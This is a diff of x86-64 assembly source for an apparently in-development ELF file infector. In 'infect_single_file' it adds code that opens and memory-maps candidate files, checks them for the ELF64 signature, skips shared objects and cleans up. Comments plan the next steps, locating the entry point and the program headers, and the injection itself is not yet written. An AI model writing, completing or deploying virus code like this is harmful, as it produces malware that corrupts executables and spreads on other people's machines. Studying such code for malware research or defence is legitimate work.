@@ -348,7 +348,7 @@ infection_routine:
 infect_single_file:
     push r8 ; fd to r8
     push r9 ; mmap buf to r9
-    push r10
+    push r10 ; size of mmap to r10
 
     mov rax, SYS_OPEN
     mov rsi, O_RDONLY
@@ -374,10 +374,13 @@ infect_single_file:
     cmp rax, THEO_MIN_SIZE
     jle .close
 
-
+    ; size of mmap to r10
+    mov r10, rax
+    
 	; addr = mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0); // NOTE: need to free this using munmap
     ; (rdi, rsi, rdx, rcx, r8, r9)
     ; mmap file contents to buffer
+    push r10
     mov rdi, 0
     mov rsi, rax
     mov rdx, PROT_READ
@@ -386,16 +389,38 @@ infect_single_file:
     mov r9, 0
     mov rax, SYS_MMAP
     syscall
+    pop r10
 
-    ; rax should have the mmap address and contents....
-    call break
+    test rax, rax
+    js .close
+    
+    ; map mmap buf to r9
+    mov r9, rax
 
     
     ; from file contents, check if its elf64.
     ; if its not elf64, close and munmap and return
-
+    mov rdi, rax
+    ; mov rsi, elf64_signature
+    lea rsi, [rel elf64_signature]
+    mov rdx, 5
+    call memcmp
+    
+    test eax, eax
+    jnz .close_munmap
+    
     
     ; get the entry point (vaddr)
+    mov rdi, r9
+    add rdi, 0x18
+
+    ; check if the 8 byte value at rdi is zero or not
+    ; if entry point is 0x0, means its a .so file. 
+    ; close and munmap and return
+    cmp qword [rdi], 0
+    je  .close_munmap 
+
+    call break
 
     ; iterate the program header, see which segment is the entry point (usually is load segment with RX)
     ; calculate entry point offset (entry vaddr - pheader.vaddr)
@@ -416,20 +441,31 @@ infect_single_file:
     ; jmp exit_ok
 
 
+.close_munmap:
+    mov rdi, r8
+    mov rax, SYS_CLOSE
+    syscall
+
+    mov rdi, r9
+    mov rsi, r10
+    mov rax, SYS_MUNMAP
+    syscall
+
+    jmp .ret
+
 .close:
     mov rdi, r8
     mov rax, SYS_CLOSE
     syscall
     jmp .ret
 
-.munmap:
-    jmp .ret
 
 .ret:
 	pop r10
     pop r9
     pop r8
     ret
+
 
 
 error_exit:
@@ -609,7 +645,6 @@ break:
     ret
 ; -----------------------------------data-in-code-------------------------------
 
-dirent_buf times DIRENT_BUF_SZ db 0x0
 elf64_signature db 0x7F, 'E', 'L', 'F', 2
 
 newline db `\n`
